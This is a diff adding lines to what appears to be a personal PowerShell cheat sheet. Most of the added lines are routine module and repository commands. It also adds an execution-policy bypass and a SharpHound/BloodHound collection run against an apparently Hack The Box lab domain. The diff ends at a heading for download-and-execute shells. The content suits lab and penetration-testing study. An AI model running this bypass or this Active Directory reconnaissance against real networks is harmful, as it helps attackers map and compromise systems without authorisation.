@@ -21,7 +21,39 @@ Set-Location C:\powershell\scripts
 set workDrv=D:
 set workDir=powershell\scripts
 & "C:\powershell\scripts\script.ps1"
+PowerShell -Exec Bypass
+	-bypass execution policy limitations
 
+Import Modules
+Import-Module C:\Scripts\PowerShellFunctionsLibrary.psm1
+Find-Module -Name "MyDSC*" | Install-Module
+Install-Module -Name "DscModule"
+Set-PSRepository -Name "myInternalSource" -SourceLocation 'http://someNuGetUrl.com/api/v2' -PublishLocation 'http://someNuGetUrl.com/api/v2/packages'
+	-Set the source and publish locations for a repository
+Set-PSRepository -Name "myInternalSource" -InstallationPolicy Trusted
+	-Set the installation policy for a repository
+Get-PSRepository
+	-list powershell repositories registered
+Get-PSRepository -Name "*NuGet*"
+	-show info about a repository
+Find-Script -Repository "Local1" -Name "Required-Script2
+	-find a scripts
+Get-Command -Name "Required-Script2"
+Install-Script -Repository "Local1" -Name "Required-Script3" -Scope "AllUsers"
+Get-InstalledScript -Name "Required-Script3"
+	-install a script with AllUsers scope
+Find-Script -Repository "Local1" -Name "Script-WithDependencies2" -IncludeDependencies
+Get-InstalledScript
+	-Install a script with its dependent scripts and modules
+Update-Script -Name "Fabrikam-Script" -RequiredVersion 1.5
+	-update a script
+Update-Module
+Update-Module -Name "DscModule"
+	-update (all) module(s)
+Import-Module ./SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -DomainController sizzle.htb.local -Domain HTB.LOCAL
+
+	
 
 Shells via powershell:
 WEBDL execute
